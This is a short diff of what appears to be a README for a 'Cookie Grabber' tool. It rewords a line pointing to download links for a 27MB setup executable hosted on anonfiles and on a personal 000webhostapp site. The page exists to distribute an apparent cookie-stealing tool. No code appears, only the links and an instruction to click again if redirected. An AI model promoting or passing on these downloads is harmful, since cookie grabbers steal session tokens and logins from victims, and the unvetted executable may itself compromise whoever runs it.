@@ -7,7 +7,7 @@ Cookie Grabber Download below ⬇ (Sorry I couldn't upload directly to github be
 
 Download(27MB): https://anonfiles.com/PfV4sbnfyc/grabber-setup_exe
 
-Or Download from my website if it doesnt work: https://bobsonhaxs.000webhostapp.com
+You can also download from my website if it doesnt work: https://bobsonhaxs.000webhostapp.com
 
 YOU MAY HAVE TO CLICK DOWNLOAD AGAIN IF IT REDIRECTS THE FIRST TIME.
 
